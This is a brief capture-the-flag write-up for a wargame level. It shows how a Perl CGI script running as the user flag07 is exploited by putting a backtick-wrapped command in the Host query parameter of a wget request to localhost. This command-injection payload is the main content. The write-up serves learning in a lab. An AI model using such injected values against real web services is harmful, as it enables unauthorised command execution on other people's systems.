### Level 07
```
ps -ef | grep flag07
```
We can see that the server is running under the ```flag07``` user.  

As always we want to execute the `getflag` command so we have to make the Perl script execute it.  
Let's try backticks:  
```wget 'http://localhost:7007/index.cgi?Host=`getflag`'```  
The output is then written into a newly created file.  

